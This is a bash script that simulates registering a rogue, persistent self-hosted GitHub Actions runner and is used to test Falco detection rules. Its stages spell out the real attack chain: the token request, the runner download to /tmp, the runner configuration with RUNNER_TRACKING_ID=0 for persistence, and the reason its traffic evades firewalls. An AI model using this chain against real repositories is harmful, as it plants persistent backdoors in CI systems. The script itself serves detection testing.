#!/usr/bin/env bash
# =============================================================================
# Rogue Self-Hosted Runner Registration via GITHUB_TOKEN
# Safe simulation of persistent backdoor runner installation.
#
# SAFE: GitHub API call uses a placeholder token — returns 401 Unauthorized.
#       Runner binary download URL is real but download is aborted (--max-time 3).
#       config.sh and run.sh are stub scripts — no real runner starts.
#       No actual runner is registered in any repository.
#
# RUNNER_TRACKING_ID=0 is the persistence mechanism documented by Sysdig:
# when set, the GitHub Actions cleanup job skips process termination after
# the current workflow completes — the rogue runner persists indefinitely.
#
# Each stage maps to one Falco rule.
# =============================================================================

set -uo pipefail

BOLD='\033[1m'
RESET='\033[0m'
RED='\033[0;31m'
YELLOW='\033[0;33m'

echo -e "${BOLD}Rogue Self-Hosted Runner Registration via GITHUB_TOKEN${RESET}"
echo "Simulating persistent backdoor runner installation (Shai-Hulud worm technique)"
echo "Reference: https://www.sysdig.com/blog/how-threat-actors-are-using-self-hosted-github-actions-runners-as-backdoors"
echo ""

# =============================================================================
# Stage 1: Runner Registration Token Request
# POST to the GitHub API runner registration endpoint using GITHUB_TOKEN.
# Returns a one-time token used to register any self-hosted runner.
# SAFE: Uses FAKE_TOKEN — GitHub returns 401. The API URL still fires the rule.
# Expected rule: Runner Registration Token Requested via GitHub API (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 1: Runner Registration Token Request ===${RESET}"
echo "Simulating: POST to api.github.com/repos/.../actions/runners/registration-token"
echo "Note: real attack uses the workflow's GITHUB_TOKEN — request returns a one-time token"
echo ""

FAKE_TOKEN="${GITHUB_TOKEN:-ghp_FAKE_SIMULATION_TOKEN_0000000000000}"
REPO="${GITHUB_REPOSITORY:-simulation-org/simulation-repo}"

curl -sf --max-time 3 \
  -X POST \
  -H "Authorization: token ${FAKE_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  "https://api.github.com/repos/${REPO}/actions/runners/registration-token" \
  2>/dev/null || true

echo -e "${RED}Expected rule: Runner Registration Token Requested via GitHub API (CRITICAL)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 2: Actions Runner Binary Download
# Download the official actions-runner tarball to /tmp/ using the real URL.
# Using the official binary avoids hash-based detection.
# SAFE: Download aborted after 3s — only partial download, no extraction.
# Expected rule: Actions Runner Binary Downloaded to Temp Path (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 2: Actions Runner Binary Download ===${RESET}"
echo "Simulating: curl download of actions-runner-linux tarball to /tmp/"
echo "Note: download aborted after 3s (--max-time 3) — no actual runner binary stored"
echo ""

curl -sL --max-time 3 \
  "https://github.com/actions/runner/releases/download/v2.313.0/actions-runner-linux-x64-2.313.0.tar.gz" \
  -o /tmp/actions-runner-sim.tar.gz \
  2>/dev/null || true

echo -e "${RED}Expected rule: Actions Runner Binary Downloaded to Temp Path (CRITICAL)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 3: Runner Archive Extraction
# Extract the runner tarball to /tmp/runner-sim/.
# SAFE: The tarball is incomplete (aborted download) — tar will fail.
#       We create a stub extraction dir to simulate the post-extraction state.
# Expected rule: Actions Runner Archive Extracted to Temp Path (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 3: Runner Archive Extraction ===${RESET}"
echo "Simulating: tar extraction of actions-runner archive to /tmp/"
echo ""

mkdir -p /tmp/runner-sim

# Attempt tar extraction — fails on incomplete download, || true absorbs the error
# The spawned_process event fires regardless of whether tar succeeds
tar -xzf /tmp/actions-runner-sim.tar.gz -C /tmp/runner-sim 2>/dev/null || true
echo "Extracted (or attempted) to /tmp/runner-sim/"

echo -e "${RED}Expected rule: Actions Runner Archive Extracted to Temp Path (CRITICAL)${RESET}"
echo ""
sleep 1

# =============================================================================
# Stage 4: Rogue Runner Configuration with RUNNER_TRACKING_ID=0
# Run config.sh with --token, --url, --name, --unattended arguments.
# RUNNER_TRACKING_ID=0 prevents the cleanup job from killing the process.
# SAFE: config.sh is a stub script — no real runner is configured or started.
# Expected rule: Rogue Runner Configured with Registration Token (CRITICAL)
# =============================================================================
echo -e "${BOLD}=== Stage 4: Rogue Runner Configuration ===${RESET}"
echo "Simulating: config.sh --url --token --name with RUNNER_TRACKING_ID=0"
echo "Note: RUNNER_TRACKING_ID=0 is the persistence mechanism — cleanup job skips termination"
echo ""

# Create stub config.sh that mimics the real runner's argument pattern
cat > /tmp/runner-sim/config.sh << 'STUBEOF'
#!/usr/bin/env bash
# Stub: simulates actions-runner config.sh argument pattern
echo "Runner configuration simulated"
echo "  URL:   $2"
echo "  Token: ${4:0:6}... (redacted)"
echo "  Name:  $6"
STUBEOF
chmod +x /tmp/runner-sim/config.sh

# Create stub run.sh
cat > /tmp/runner-sim/run.sh << 'STUBEOF'
#!/usr/bin/env bash
# Stub: simulates actions-runner run.sh
echo "Rogue runner started — polling github.com:443 for jobs (simulated)"
STUBEOF
chmod +x /tmp/runner-sim/run.sh

# Execute config.sh with the same arguments a real attack uses
RUNNER_TRACKING_ID=0 bash /tmp/runner-sim/config.sh \
  --url "https://github.com/${REPO}" \
  --token "AAAAAAAAAAAAAAAAAAAAAAAAAAA" \
  --name "rogue-runner-backdoor" \
  --unattended \
  2>/dev/null || true

echo ""
echo "Persistence note: RUNNER_TRACKING_ID=0 prevents cleanup job from"
echo "terminating this process when the current workflow completes."

echo -e "${RED}Expected rule: Rogue Runner Configured with Registration Token (CRITICAL)${RESET}"
echo ""

# =============================================================================
# Cleanup
# =============================================================================
rm -f /tmp/actions-runner-sim.tar.gz
rm -rf /tmp/runner-sim

# =============================================================================
echo -e "${BOLD}=== Simulation Complete ===${RESET}"
echo ""
echo "Rules expected to fire:"
echo "  CRITICAL  Runner Registration Token Requested via GitHub API"
echo "  CRITICAL  Actions Runner Binary Downloaded to Temp Path"
echo "  CRITICAL  Actions Runner Archive Extracted to Temp Path"
echo "  CRITICAL  Rogue Runner Configured with Registration Token"
echo ""
echo "Why this evades network defenses:"
echo "  All runner C2 traffic flows to github.com:443 — whitelisted by all enterprise firewalls"
echo "  Syscall-level detection (this rule set) is the only reliable detection path"
